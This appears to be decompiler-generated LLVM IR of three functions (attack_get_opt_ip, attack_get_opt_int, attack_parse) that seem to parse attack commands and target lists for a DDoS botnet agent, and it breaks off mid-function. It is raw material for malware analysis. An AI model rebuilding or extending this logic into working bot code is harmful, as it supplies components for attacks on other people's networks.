define i32 @attack_get_opt_ip(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %v0_8048210 = load i32, i32* @edi, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v0_8048212 = load i32, i32* @ebx, align 4
  %v4_8048216 = zext i8 %arg1 to i32
  %v5_8048216 = load i32, i32* @eax, align 4
  store i32 %v4_8048216, i32* @edx, align 4
  %v4_8048234 = icmp eq i8 %arg1, 0
  br i1 %v4_8048234, label %dec_label_pc_804825b, label %dec_label_pc_8048238

dec_label_pc_8048238:                             ; preds = %entry
  %v3_804823c = add i32 %arg2, 4
  %v4_804823c = inttoptr i32 %v3_804823c to i8*
  %v5_804823c = load i8, i8* %v4_804823c, align 1
  %v16_804823c = icmp eq i8 %tmp, %v5_804823c
  br i1 %v16_804823c, label %dec_label_pc_8048262, label %dec_label_pc_8048241

dec_label_pc_8048241:                             ; preds = %dec_label_pc_8048238
  %v6_8048216 = and i32 %v5_8048216, -256
  %v4_8048238 = urem i32 %arg3, 256
  %v7_8048238 = or i32 %v6_8048216, %v4_8048238
  %v1_8048241 = add i32 %arg2, 8
  br label %dec_label_pc_8048256

dec_label_pc_8048248:                             ; preds = %dec_label_pc_8048256
  %v1_8048248 = add i32 %v0_804824b, 4
  %v2_8048248 = inttoptr i32 %v1_8048248 to i8*
  %v3_8048248 = load i8, i8* %v2_8048248, align 1
  %v4_8048248 = zext i8 %v3_8048248 to i32
  %v6_8048248 = and i32 %v5_8048248, -256
  %v7_8048248 = or i32 %v4_8048248, %v6_8048248
  %v1_804824d = add i32 %v0_804824b, 8
  store i32 %v1_804824d, i32* @edx, align 4
  %v16_8048250 = icmp eq i8 %tmp, %v3_8048248
  br i1 %v16_8048250, label %dec_label_pc_8048262, label %dec_label_pc_8048256

dec_label_pc_8048256:                             ; preds = %dec_label_pc_8048248, %dec_label_pc_8048241
  %v5_8048248 = phi i32 [ %v7_8048248, %dec_label_pc_8048248 ], [ %v7_8048238, %dec_label_pc_8048241 ]
  %v0_804824b = phi i32 [ %v1_804824d, %dec_label_pc_8048248 ], [ %v1_8048241, %dec_label_pc_8048241 ]
  %v0_8048256 = phi i32 [ %v1_8048256, %dec_label_pc_8048248 ], [ 0, %dec_label_pc_8048241 ]
  %v1_8048256 = add i32 %v0_8048256, 1
  %v12_8048257 = icmp eq i32 %v4_8048216, %v1_8048256
  %v1_8048259 = icmp eq i1 %v12_8048257, false
  br i1 %v1_8048259, label %dec_label_pc_8048248, label %dec_label_pc_804825b

dec_label_pc_804825b:                             ; preds = %dec_label_pc_8048256, %dec_label_pc_8048262, %entry
  store i32 %v0_8048212, i32* @ebx, align 4
  store i32 %v0_8048211, i32* @esi, align 4
  store i32 %v0_8048210, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_8048262:                             ; preds = %dec_label_pc_8048248, %dec_label_pc_8048238
  %v0_8048262 = phi i32 [ %arg2, %dec_label_pc_8048238 ], [ %v0_804824b, %dec_label_pc_8048248 ]
  %v1_8048262 = inttoptr i32 %v0_8048262 to i32*
  %v2_8048262 = load i32, i32* %v1_8048262, align 4
  %sext = mul i32 %v2_8048262, 16777216
  %v2_8048264 = icmp eq i32 %sext, 0
  br i1 %v2_8048264, label %dec_label_pc_804825b, label %dec_label_pc_8048268

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048262
  store i32 %v0_8048212, i32* @ebx, align 4
  store i32 %v0_8048211, i32* @esi, align 4
  store i32 %v0_8048210, i32* @edi, align 4
  %v1_8048270 = sdiv i32 %sext, 16777216
  %v2_8048270 = call i32 @inet_addr(i32 %v1_8048270)
  ret i32 %v2_8048270

; uselistorder directives
  uselistorder i32 %v0_804824b, { 0, 2, 1 }
  uselistorder i32 %v0_8048212, { 1, 0 }
  uselistorder i32 %v0_8048211, { 1, 0 }
  uselistorder i32 %v0_8048210, { 1, 0 }
  uselistorder label %dec_label_pc_804825b, { 1, 0, 2 }
}

define i32 @attack_get_opt_int(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %v0_8048280 = load i32, i32* @edi, align 4
  %v0_8048281 = load i32, i32* @esi, align 4
  %v0_8048282 = load i32, i32* @ebx, align 4
  %v4_8048286 = zext i8 %arg1 to i32
  %v4_80482a4 = icmp eq i8 %arg1, 0
  br i1 %v4_80482a4, label %dec_label_pc_80482cb, label %dec_label_pc_80482a8

dec_label_pc_80482a8:                             ; preds = %entry
  %v3_80482ac = add i32 %arg2, 4
  %v4_80482ac = inttoptr i32 %v3_80482ac to i8*
  %v5_80482ac = load i8, i8* %v4_80482ac, align 1
  %v16_80482ac = icmp eq i8 %tmp, %v5_80482ac
  br i1 %v16_80482ac, label %dec_label_pc_80482d2, label %dec_label_pc_80482b1

dec_label_pc_80482b1:                             ; preds = %dec_label_pc_80482a8
  %v5_8048286 = load i32, i32* @eax, align 4
  %v6_8048286 = and i32 %v5_8048286, -256
  %v4_80482a8 = urem i32 %arg3, 256
  %v7_80482a8 = or i32 %v6_8048286, %v4_80482a8
  br label %dec_label_pc_80482c6

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_80482c6
  %v1_80482b8 = add i32 %v0_80482bb.in, 12
  %v2_80482b8 = inttoptr i32 %v1_80482b8 to i8*
  %v3_80482b8 = load i8, i8* %v2_80482b8, align 1
  %v4_80482b8 = zext i8 %v3_80482b8 to i32
  %v6_80482b8 = and i32 %v5_80482b8, -256
  %v7_80482b8 = or i32 %v4_80482b8, %v6_80482b8
  %v16_80482c0 = icmp eq i8 %tmp, %v3_80482b8
  br i1 %v16_80482c0, label %dec_label_pc_80482d2, label %dec_label_pc_80482c6

dec_label_pc_80482c6:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482b1
  %v5_80482b8 = phi i32 [ %v7_80482b8, %dec_label_pc_80482b8 ], [ %v7_80482a8, %dec_label_pc_80482b1 ]
  %v0_80482bb.in = phi i32 [ %v0_80482bb, %dec_label_pc_80482b8 ], [ %arg2, %dec_label_pc_80482b1 ]
  %v0_80482c6 = phi i32 [ %v1_80482c6, %dec_label_pc_80482b8 ], [ 0, %dec_label_pc_80482b1 ]
  %v0_80482bb = add i32 %v0_80482bb.in, 8
  %v1_80482c6 = add i32 %v0_80482c6, 1
  %v12_80482c7 = icmp eq i32 %v4_8048286, %v1_80482c6
  %v1_80482c9 = icmp eq i1 %v12_80482c7, false
  br i1 %v1_80482c9, label %dec_label_pc_80482b8, label %dec_label_pc_80482cb

dec_label_pc_80482cb:                             ; preds = %dec_label_pc_80482c6, %dec_label_pc_80482d2, %entry
  store i32 %v0_8048282, i32* @ebx, align 4
  store i32 %v0_8048281, i32* @esi, align 4
  store i32 %v0_8048280, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_80482d2:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482a8
  %v0_80482d2 = phi i32 [ %arg2, %dec_label_pc_80482a8 ], [ %v0_80482bb, %dec_label_pc_80482b8 ]
  %v1_80482d2 = inttoptr i32 %v0_80482d2 to i32*
  %v2_80482d2 = load i32, i32* %v1_80482d2, align 4
  store i32 %v2_80482d2, i32* @eax, align 4
  %sext = mul i32 %v2_80482d2, 16777216
  %v2_80482d4 = icmp eq i32 %sext, 0
  br i1 %v2_80482d4, label %dec_label_pc_80482cb, label %dec_label_pc_80482d8

dec_label_pc_80482d8:                             ; preds = %dec_label_pc_80482d2
  store i32 %v0_8048282, i32* @ebx, align 4
  store i32 %v0_8048281, i32* @esi, align 4
  store i32 %v0_8048280, i32* @edi, align 4
  %v2_80482e8 = sdiv i32 %sext, 16777216
  %v3_80482e8 = inttoptr i32 %v2_80482e8 to i8*
  %v4_80482e8 = call i32 @util_atoi(i8* %v3_80482e8, i32 10)
  ret i32 %v4_80482e8

; uselistorder directives
  uselistorder i32 %v0_80482bb.in, { 1, 0 }
  uselistorder i32 %v0_8048282, { 1, 0 }
  uselistorder i32 %v0_8048281, { 1, 0 }
  uselistorder i32 %v0_8048280, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80482cb, { 1, 0, 2 }
}

define i32 @attack_parse() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i32, align 4
  %v0_80482f0 = load i32, i32* @ebp, align 4
  %v0_80482f1 = load i32, i32* @edi, align 4
  %v0_80482f2 = load i32, i32* @esi, align 4
  %v0_80482f3 = load i32, i32* @ebx, align 4
  %v15_80482f4 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %tmp41, i32* %eax.global-to-local, align 4
  store i32 %tmp40, i32* %edx.global-to-local, align 4
  %v9_80482ff = icmp eq i32 %tmp41, 3
  store i1 %v9_80482ff, i1* %zf.global-to-local, align 1
  %v6_8048302 = icmp ugt i32 %tmp41, 3
  br i1 %v6_8048302, label %dec_label_pc_804830c, label %dec_label_pc_8048304

dec_label_pc_8048304:                             ; preds = %dec_label_pc_80483e5.dec_label_pc_8048304_crit_edge, %dec_label_pc_8048331, %dec_label_pc_804832a, %dec_label_pc_804831e, %dec_label_pc_804830c, %entry
  %v0_804830b = phi i32 [ %v0_804830b28, %dec_label_pc_80483e5.dec_label_pc_8048304_crit_edge ], [ %v1_8048337, %dec_label_pc_8048331 ], [ %tmp41, %dec_label_pc_804832a ], [ 5, %dec_label_pc_804831e ], [ 4, %dec_label_pc_804830c ], [ %tmp41, %entry ]
  %v0_8048304 = phi i32 [ %v0_8048304.pre, %dec_label_pc_80483e5.dec_label_pc_8048304_crit_edge ], [ %v15_80482f4, %dec_label_pc_8048331 ], [ %v15_80482f4, %dec_label_pc_804832a ], [ %v15_80482f4, %dec_label_pc_804831e ], [ %v15_80482f4, %dec_label_pc_804830c ], [ %v15_80482f4, %entry ]
  %v9_8048304 = icmp eq i32 %v0_8048304, -60
  store i1 %v9_8048304, i1* %zf.global-to-local, align 1
  store i32 %v0_80482f3, i32* @ebx, align 4
  store i32 %v0_80482f2, i32* @esi, align 4
  store i32 %v0_80482f0, i32* @ebp, align 4
  ret i32 %v0_804830b

dec_label_pc_804830c:                             ; preds = %entry
  %v1_804830c = inttoptr i32 %tmp40 to i32*
  %v2_804830c = load i32, i32* %v1_804830c, align 4
  %v1_804830e = trunc i32 %v2_804830c to i16
  %v2_804830e = call i16 @llvm.bswap.i16(i16 %v1_804830e)
  %v3_804830e = zext i16 %v2_804830e to i32
  %v1_8048312 = udiv i32 %v2_804830c, 65536
  %v2_8048312 = mul nuw i32 %v3_804830e, 65536
  %v1_8048315 = trunc i32 %v1_8048312 to i16
  %v2_8048315 = call i16 @llvm.bswap.i16(i16 %v1_8048315)
  %v3_8048315 = zext i16 %v2_8048315 to i32
  %v6_8048315 = or i32 %v3_8048315, %v2_8048312
  store i32 %v6_8048315, i32* @ebp, align 4
  %v9_8048319 = icmp eq i32 %tmp41, 4
  store i1 %v9_8048319, i1* %zf.global-to-local, align 1
  br i1 %v9_8048319, label %dec_label_pc_8048304, label %dec_label_pc_804831e

dec_label_pc_804831e:                             ; preds = %dec_label_pc_804830c
  %v1_804831e = add i32 %tmp40, 4
  %v2_804831e = inttoptr i32 %v1_804831e to i8*
  %v3_804831e = load i8, i8* %v2_804831e, align 1
  %v4_804831e = zext i8 %v3_804831e to i32
  %v5_804831e = load i32, i32* @ecx, align 4
  %v6_804831e = and i32 %v5_804831e, -256
  %v7_804831e = or i32 %v6_804831e, %v4_804831e
  store i32 %v7_804831e, i32* %ecx.global-to-local, align 4
  %v9_8048321 = icmp eq i32 %tmp41, 5
  store i1 %v9_8048321, i1* %zf.global-to-local, align 1
  br i1 %v9_8048321, label %dec_label_pc_8048304, label %dec_label_pc_804832a

dec_label_pc_804832a:                             ; preds = %dec_label_pc_804831e
  %v1_804832a = add i32 %tmp40, 5
  %v2_804832a = inttoptr i32 %v1_804832a to i8*
  %v3_804832a = load i8, i8* %v2_804832a, align 1
  %v4_804832a = zext i8 %v3_804832a to i32
  %v7_804832a = or i32 %v4_804832a, %v6_804831e
  store i32 %v7_804832a, i32* %ecx.global-to-local, align 4
  %v4_804832d = icmp eq i8 %v3_804832a, 0
  store i1 %v4_804832d, i1* %zf.global-to-local, align 1
  br i1 %v4_804832d, label %dec_label_pc_8048304, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_804832a
  store i32 %v4_804832a, i32* %ecx.global-to-local, align 4
  %v1_8048337 = add i32 %tmp41, -6
  store i32 %v1_8048337, i32* %eax.global-to-local, align 4
  %v3_804833e = mul nuw nsw i32 %v4_804832a, 5
  store i32 %v3_804833e, i32* @esi, align 4
  %v7_8048341 = icmp ult i32 %v1_8048337, %v3_804833e
  %v12_8048341 = icmp eq i32 %v1_8048337, %v3_804833e
  store i1 %v12_8048341, i1* %zf.global-to-local, align 1
  br i1 %v7_8048341, label %dec_label_pc_8048304, label %dec_label_pc_8048345

dec_label_pc_8048345:                             ; preds = %dec_label_pc_8048331
  store i32 %v4_804832a, i32* %eax.global-to-local, align 4
  %v1_8048351 = add i32 %tmp40, 6
  store i32 %v1_8048351, i32* @ebx, align 4
  %v2_8048355 = zext i8 %v3_804832a to i64
  %v3_8048355 = call i32 @calloc(i64 %v2_8048355, i32 24)
  store i32 %v3_8048355, i32* %eax.global-to-local, align 4
  %v0_804835a = load i32, i32* @esi, align 4
  %v1_804835a = load i32, i32* @ebx, align 4
  %v2_804835a = add i32 %v1_804835a, %v0_804835a
  store i32 %v2_804835a, i32* @esi, align 4
  store i32 %v3_8048355, i32* %ecx.global-to-local, align 4
  %v0_8048362 = load i32, i32* @esp, align 4
  %v6_8048362 = icmp eq i32 %v0_8048362, -16
  store i1 %v6_8048362, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048365

dec_label_pc_8048365:                             ; preds = %dec_label_pc_8048365, %dec_label_pc_8048345
  %v1_8048367 = phi i32 [ %v3_8048355, %dec_label_pc_8048345 ], [ %v1_8048382, %dec_label_pc_8048365 ]
  %v0_8048365 = phi i32 [ %v1_804835a, %dec_label_pc_8048345 ], [ %v0_8048389, %dec_label_pc_8048365 ]
  %stack_var_-28.0 = phi i32 [ %v1_8048337, %dec_label_pc_8048345 ], [ %v1_804837f, %dec_label_pc_8048365 ]
  %v1_8048365 = inttoptr i32 %v0_8048365 to i32*
  %v2_8048365 = load i32, i32* %v1_8048365, align 4
  store i32 %v2_8048365, i32* %edx.global-to-local, align 4
  %v2_8048367 = add i32 %v1_8048367, 16
  %v3_8048367 = inttoptr i32 %v2_8048367 to i32*
  store i32 %v2_8048365, i32* %v3_8048367, align 4
  %v0_804836a = load i32, i32* @ebx, align 4
  %v1_804836a = add i32 %v0_804836a, 4
  %v2_804836a = inttoptr i32 %v1_804836a to i8*
  %v3_804836a = load i8, i8* %v2_804836a, align 1
  %v1_804836d = add i32 %v0_804836a, 5
  store i32 %v1_804836d, i32* @ebx, align 4
  %v2_8048370 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8048370 = add i32 %v2_8048370, 20
  %v4_8048370 = inttoptr i32 %v3_8048370 to i8*
  store i8 %v3_804836a, i8* %v4_8048370, align 1
  %v0_8048373 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8048373 = inttoptr i32 %v0_8048373 to i16*
  store i16 2, i16* %v1_8048373, align 2
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  %v0_804837c = load i32, i32* %edx.global-to-local, align 4
  %v1_804837c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804837c = add i32 %v1_804837c, 4
  %v3_804837c = inttoptr i32 %v2_804837c to i32*
  store i32 %v0_804837c, i32* %v3_804837c, align 4
  %v0_804837f = load i32, i32* %eax.global-to-local, align 4
  %v1_804837f = add i32 %v0_804837f, -5
  store i32 %v1_804837f, i32* %eax.global-to-local, align 4
  %v0_8048382 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8048382 = add i32 %v0_8048382, 24
  store i32 %v1_8048382, i32* %ecx.global-to-local, align 4
  %v0_8048389 = load i32, i32* @ebx, align 4
  %v1_8048389 = load i32, i32* @esi, align 4
  %v12_8048389 = icmp eq i32 %v0_8048389, %v1_8048389
  store i1 %v12_8048389, i1* %zf.global-to-local, align 1
  %v1_804838b = icmp eq i1 %v12_8048389, false
  br i1 %v1_804838b, label %dec_label_pc_8048365, label %dec_label_pc_804838d

dec_label_pc_804838d:                             ; preds = %dec_label_pc_8048365
  %v9_804837f.le = icmp eq i32 %v1_804837f, 0
  store i32 %v1_804837f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i1 %v9_804837f.le, i1* %zf.global-to-local, align 1
  br i1 %v9_804837f.le, label %dec_label_pc_80483cd, label %dec_label_pc_8048397

dec_label_pc_8048397:                             ; preds = %dec_label_pc_804838d
  %v1_8048397 = inttoptr i32 %v0_8048389 to i8*
  %v2_8048397 = load i8, i8* %v1_8048397, align 1
  %v3_8048397 = zext i8 %v2_8048397 to i32
  store i32 %v3_8048397, i32* @esi, align 4
  store i32 %v3_8048397, i32* %edx.global-to-local, align 4
  %v1_80483a0 = add i32 %v0_804837f, -6
  store i32 %v1_80483a0, i32* %eax.global-to-local, align 4
  %v4_80483a1 = icmp eq i8 %v2_8048397, 0
  store i1 %v4_80483a1, i1* %zf.global-to-local, align 1
  %v1_80483a7 = icmp eq i1 %v4_80483a1, false
  br i1 %v1_80483a7, label %dec_label_pc_8048429, label %dec_label_pc_80483b5

dec_label_pc_80483b5:                             ; preds = %dec_label_pc_80484fb, %dec_label_pc_8048397
  %stack_var_-32.0 = phi i32 [ %tmp29, %dec_label_pc_8048397 ], [ %stack_var_-32.1, %dec_label_pc_80484fb ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8048397 ], [ %v1_804842c, %dec_label_pc_80484fb ]
  %stack_var_-20.0 = phi i32 [ %v1_80483a0, %dec_label_pc_8048397 ], [ %stack_var_-20.2, %dec_label_pc_80484fb ]
  %v2_80483b5 = call i32 @__GI___errno_location(i32 %stack_var_-36.0, i32 %stack_var_-32.0)
  store i32 %v2_80483b5, i32* %eax.global-to-local, align 4
  %v1_80483ba = inttoptr i32 %v2_80483b5 to i32*
  store i32 0, i32* %v1_80483ba, align 4
  %v1_80483c0 = call i32 @__libc_fork(i32 %stack_var_-36.0)
  store i32 %v1_80483c0, i32* %eax.global-to-local, align 4
  %v1_80483c5 = icmp eq i32 %v1_80483c0, 0
  store i1 %v1_80483c5, i1* %zf.global-to-local, align 1
  %tmp58 = icmp slt i32 %v1_80483c0, 1
  br i1 %tmp58, label %dec_label_pc_804853e, label %dec_label_pc_80483cd

dec_label_pc_80483cd:                             ; preds = %dec_label_pc_80484d4, %dec_label_pc_80484ad, %dec_label_pc_804849f, %dec_label_pc_8048469, %dec_label_pc_804853e, %dec_label_pc_8048458, %dec_label_pc_8048429, %dec_label_pc_80483b5, %dec_label_pc_804838d
  %stack_var_-20.1 = phi i32 [ %tmp35, %dec_label_pc_804838d ], [ 0, %dec_label_pc_8048429 ], [ %stack_var_-20.2, %dec_label_pc_8048458 ], [ %stack_var_-20.0, %dec_label_pc_804853e ], [ %stack_var_-20.0, %dec_label_pc_80483b5 ], [ %stack_var_-20.2, %dec_label_pc_8048469 ], [ %stack_var_-20.2, %dec_label_pc_804849f ], [ %stack_var_-20.2, %dec_label_pc_80484ad ], [ %stack_var_-20.2, %dec_label_pc_80484d4 ]
  store i32 %v3_8048355, i32* %eax.global-to-local, align 4
  %v1_80483d1 = icmp eq i32 %v3_8048355, 0
  store i1 %v1_80483d1, i1* %zf.global-to-local, align 1
  br i1 %v1_80483d1, label %dec_label_pc_80483e5, label %dec_label_pc_80483d5

dec_label_pc_80483d5:                             ; preds = %dec_label_pc_80483cd
  %v0_80483d5 = load i32, i32* @esp, align 4
  %v9_80483d5 = icmp eq i32 %v0_80483d5, 12
  store i1 %v9_80483d5, i1* %zf.global-to-local, align 1
  store i32 %v3_8048355, i32* @ebp, align 4
  %v1_80483dd = call i32 @free(i32 %v3_8048355)
  store i32 %v1_80483dd, i32* %eax.global-to-local, align 4
  %v0_80483e2 = load i32, i32* @esp, align 4
  %v6_80483e2 = icmp eq i32 %v0_80483e2, -16
  store i1 %v6_80483e2, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80483e5

dec_label_pc_80483e5:                             ; preds = %dec_label_pc_80483cd, %dec_label_pc_80483d5
  %v0_804830b28 = phi i32 [ 0, %dec_label_pc_80483cd ], [ %v1_80483dd, %dec_label_pc_80483d5 ]
  %v0_80483e5 = load i32, i32* @edi, align 4
  %v1_80483e5 = icmp eq i32 %v0_80483e5, 0
  store i1 %v1_80483e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80483e5, label %dec_label_pc_80483e5.dec_label_pc_8048304_crit_edge, label %dec_label_pc_80483ed

dec_label_pc_80483e5.dec_label_pc_8048304_crit_edge: ; preds = %dec_label_pc_80483e5
  %v0_8048304.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048304

dec_label_pc_80483ed:                             ; preds = %dec_label_pc_80483e5
  %v0_80483ed = load i32, i32* @esi, align 4
  store i32 %v0_80483ed, i32* %eax.global-to-local, align 4
  %v3_80483ef = trunc i32 %v0_80483ed to i8
  %v4_80483ef = icmp eq i8 %v3_80483ef, 0
  store i1 %v4_80483ef, i1* %zf.global-to-local, align 1
  br i1 %v4_80483ef, label %dec_label_pc_8048419, label %dec_label_pc_80483f3

dec_label_pc_80483f3:                             ; preds = %dec_label_pc_80483ed
  %v1_80483f3 = urem i32 %v0_80483ed, 256
  %v2_80483f3 = icmp eq i32 %v1_80483f3, 0
  store i1 %v2_80483f3, i1* %zf.global-to-local, align 1
  store i32 %v1_80483f3, i32* %eax.global-to-local, align 4
  store i32 1, i32* @ebx, align 4
  %v1_80483fd = add nuw nsw i32 %v1_80483f3, 1
  store i32 %v1_80483fd, i32* @esi, align 4
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_8048414, %dec_label_pc_80483f3
  %v1_804841511 = phi i32 [ %v1_80483fd, %dec_label_pc_80483f3 ], [ %v1_8048415, %dec_label_pc_8048414 ]
  %v1_8048400 = phi i32 [ 1, %dec_label_pc_80483f3 ], [ %v1_8048414, %dec_label_pc_8048414 ]
  %v0_8048400 = phi i32 [ %v0_80483e5, %dec_label_pc_80483f3 ], [ %v0_8048400.pre, %dec_label_pc_8048414 ]
  %v2_8048400 = mul i32 %v1_8048400, 8
  %v3_8048400 = add i32 %v0_8048400, -8
  %v4_8048400 = add i32 %v3_8048400, %v2_8048400
  %v5_8048400 = inttoptr i32 %v4_8048400 to i32*
  %v6_8048400 = load i32, i32* %v5_8048400, align 4
  store i32 %v6_8048400, i32* %eax.global-to-local, align 4
  %v1_8048404 = icmp eq i32 %v6_8048400, 0
  store i1 %v1_8048404, i1* %zf.global-to-local, align 1
  br i1 %v1_8048404, label %dec_label_pc_8048414, label %dec_label_pc_8048408

dec_label_pc_8048408:                             ; preds = %dec_label_pc_8048400
  %v0_8048408 = load i32, i32* @esp, align 4
  %v9_8048408 = icmp eq i32 %v0_8048408, 12
  store i1 %v9_8048408, i1* %zf.global-to-local, align 1
  %v1_804840c = call i32 @free(i32 %v6_8048400)
  store i32 %v1_804840c, i32* %eax.global-to-local, align 4
  %v0_8048411 = load i32, i32* @esp, align 4
  %v6_8048411 = icmp eq i32 %v0_8048411, -16
  store i1 %v6_8048411, i1* %zf.global-to-local, align 1
  %v0_8048414.pre = load i32, i32* @ebx, align 4
  %v1_8048415.pre = load i32, i32* @esi, align 4
  %v0_8048400.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8048414

dec_label_pc_8048414:                             ; preds = %dec_label_pc_8048400, %dec_label_pc_8048408
  %v0_8048400.pre = phi i32 [ %v0_8048400, %dec_label_pc_8048400 ], [ %v0_8048400.pre.pre, %dec_label_pc_8048408 ]
  %v1_8048415 = phi i32 [ %v1_804841511, %dec_label_pc_8048400 ], [ %v1_8048415.pre, %dec_label_pc_8048408 ]
  %v0_8048414 = phi i32 [ %v1_8048400, %dec_label_pc_8048400 ], [ %v0_8048414.pre, %dec_label_pc_8048408 ]
  %v1_8048414 = add i32 %v0_8048414, 1
  store i32 %v1_8048414, i32* @ebx, align 4
  %v12_8048415 = icmp eq i32 %v1_8048414, %v1_8048415
  store i1 %v12_8048415, i1* %zf.global-to-local, align 1
  %v1_8048417 = icmp eq i1 %v12_8048415, false
  br i1 %v1_8048417, label %dec_label_pc_8048400, label %dec_label_pc_8048419

dec_label_pc_8048419:                             ; preds = %dec_label_pc_8048414, %dec_label_pc_80483ed
  %v0_8048419 = phi i32 [ %v0_80483e5, %dec_label_pc_80483ed ], [ %v0_8048400.pre, %dec_label_pc_8048414 ]
  %v0_804841d = load i32, i32* @esp, align 4
  %v9_804841d = icmp eq i32 %v0_804841d, -60
  store i1 %v9_804841d, i1* %zf.global-to-local, align 1
  store i32 %v0_80482f3, i32* @ebx, align 4
  store i32 %v0_80482f2, i32* @esi, align 4
  store i32 %v0_80482f1, i32* @edi, align 4
  store i32 %v0_80482f0, i32* @ebp, align 4
  %v1_8048424 = call i32 @free(i32 %v0_8048419)
  store i32 %v1_8048424, i32* %eax.global-to-local, align 4
  %v0_8048429.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048429

dec_label_pc_8048429:                             ; preds = %dec_label_pc_8048397, %dec_label_pc_8048419
  %v0_8048429 = phi i32 [ %v0_8048429.pre, %dec_label_pc_8048419 ], [ %v3_8048397, %dec_label_pc_8048397 ]
  %stack_var_-20.2 = phi i32 [ %stack_var_-20.1, %dec_label_pc_8048419 ], [ %v1_80483a0, %dec_label_pc_8048397 ]
  %v1_804842c = urem i32 %v0_8048429, 256
  %v2_804842c = icmp eq i32 %v1_804842c, 0
  store i1 %v2_804842c, i1* %zf.global-to-local, align 1
  store i32 %v1_804842c, i32* %ecx.global-to-local, align 4
  %v2_804843a1 = zext i32 %v1_804842c to i64
  %v3_804843a = call i32 @calloc(i64 %v2_804843a1, i32 8)
  store i32 %v3_804843a, i32* @edi, align 4
  store i32 %stack_var_-20.2, i32* %eax.global-to-local, align 4
  %v1_8048450 = icmp eq i32 %stack_var_-20.2, 0
  store i1 %v1_8048450, i1* %zf.global-to-local, align 1
  br i1 %v1_8048450, label %dec_label_pc_80483cd, label %dec_label_pc_8048458

dec_label_pc_8048458:                             ; preds = %dec_label_pc_8048429
  %v0_8048458 = load i32, i32* @ebx, align 4
  %v1_8048458 = add i32 %v0_8048458, 1
  %v2_8048458 = inttoptr i32 %v1_8048458 to i8*
  %v3_8048458 = load i8, i8* %v2_8048458, align 1
  %v4_8048458 = zext i8 %v3_8048458 to i32
  %v6_8048458 = and i32 %stack_var_-20.2, -256
  %v7_8048458 = or i32 %v4_8048458, %v6_8048458
  store i32 %v7_8048458, i32* %eax.global-to-local, align 4
  %v3_804845b = add i32 %v3_804843a, 4
  %v4_804845b = inttoptr i32 %v3_804845b to i8*
  store i8 %v3_8048458, i8* %v4_804845b, align 1
  %v12_804845e = icmp eq i32 %v0_804837f, 7
  store i1 %v12_804845e, i1* %zf.global-to-local, align 1
  br i1 %v12_804845e, label %dec_label_pc_80483cd, label %dec_label_pc_8048469

dec_label_pc_8048469:                             ; preds = %dec_label_pc_8048458
  %v0_8048469 = load i32, i32* @ebx, align 4
  %v1_8048469 = add i32 %v0_8048469, 2
  %v2_8048469 = inttoptr i32 %v1_8048469 to i8*
  %v3_8048469 = load i8, i8* %v2_8048469, align 1
  %v4_8048469 = zext i8 %v3_8048469 to i32
  %v5_8048469 = load i32, i32* @edx, align 4
  %v6_8048469 = and i32 %v5_8048469, -256
  %v7_8048469 = or i32 %v6_8048469, %v4_8048469
  store i32 %v7_8048469, i32* %edx.global-to-local, align 4
  %v1_8048472 = add i32 %v0_804837f, -8
  store i32 %v1_8048472, i32* %ecx.global-to-local, align 4
  store i32 %v4_8048469, i32* %eax.global-to-local, align 4
  %v2_8048486 = sub i32 %v1_8048472, %v4_8048469
  %tmp59 = xor i32 %v2_8048486, -2147483648
  %v10_8048486 = and i32 %tmp59, %v1_8048472
  %v11_8048486 = icmp slt i32 %v10_8048486, 0
  %v12_8048486 = icmp eq i32 %v2_8048486, 0
  store i1 %v12_8048486, i1* %zf.global-to-local, align 1
  %v13_8048486 = icmp slt i32 %v2_8048486, 0
  %v2_8048488 = icmp eq i1 %v13_8048486, %v11_8048486
  br i1 %v2_8048488, label %dec_label_pc_804848e, label %dec_label_pc_80483cd

dec_label_pc_804848e:                             ; preds = %dec_label_pc_8048469
  %v1_804848e = add i32 %v0_8048469, 3
  %v9_804848e = icmp eq i32 %v1_804848e, 0
  store i1 %v9_804848e, i1* %zf.global-to-local, align 1
  store i32 %v1_804848e, i32* @ebx, align 4
  %v0_8048491 = load i32, i32* @edi, align 4
  br label %dec_label_pc_80484fb

dec_label_pc_804849f:                             ; preds = %dec_label_pc_80484fb
  %v5_80484a3 = sub i32 %stack_var_-24.0, %stack_var_-48.0
  %v15_80484a3 = icmp eq i32 %v5_80484a3, 0
  store i1 %v15_80484a3, i1* %zf.global-to-local, align 1
  store i32 %v5_80484a3, i32* %ecx.global-to-local, align 4
